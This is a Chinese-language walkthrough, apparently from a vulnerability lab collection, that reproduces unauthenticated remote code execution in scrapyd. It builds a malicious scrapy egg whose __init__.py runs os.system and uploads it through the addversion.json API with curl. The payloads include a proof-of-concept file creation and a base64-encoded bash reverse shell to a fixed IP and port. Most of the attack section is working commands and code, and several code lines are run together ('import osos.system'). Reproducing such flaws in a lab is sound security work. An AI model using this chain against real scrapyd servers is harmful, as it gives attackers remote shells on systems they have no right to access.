# scrapyd 未授权访问漏洞

## 环境搭建

执行如下命令启动scrapyd服务：

```plain
docker compose up -d
```

环境启动后，访问http://your-ip:6800即可看到Web界面。

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780907502201-eba059f1-b6a9-4c67-af16-732200091366.png)

## 漏洞复现

参考[攻击Scrapyd爬虫](https://www.leavesongs.com/PENETRATION/attack-scrapy.html#tdsub)，构造一个恶意的scrapy包：

```plain
$ pip install scrapy scrapyd-client
$ scrapy startproject evil
$ cd evil
```

编辑 evil/__init__.py, 加入恶意代码：

```plain
import osos.system('touch awesome_poc')
```

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780907502280-e27f44c8-12b5-41b2-9046-5dc290134015.png)

进行部署：

```plain
$ scrapyd-deploy --build-egg=evil.egg
```

向API接口发送恶意包：

```plain
curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

成功执行命令touch awesome_poc：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780907502216-3c2b287d-b690-4d7e-a9aa-432743b0cc0d.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780907502360-6813fe83-2c66-4cac-9f92-7dfaeb220902.png)

同样的方法实现反弹shell，编辑 evil/__init__.py, 加入恶意代码：

```plain
bash -i >& /dev/tcp/192.168.174.128/9999 0>&1

# base64编码（必须要base64编码，直接bash -i >& /dev/tcp/192.168.174.128/9999 0>&1是不行的）
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo=
import osos.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvOTk5OSAwPiYxCgo= | base64 -d | bash')
```

进行部署：

```plain
$ scrapyd-deploy --build-egg=evil.egg
```

向API接口发送恶意包：

```plain
curl http://your-ip:6800/addversion.json -F project=evil -F version=r01 -F egg=@evil.egg
```

成功反弹shell：

![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780907502440-bf7d2871-0d70-482a-b0e2-85b3155e0a5f.png)![img](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780907503125-957c6e3e-645f-4b71-be4b-6e5d15946e81.png)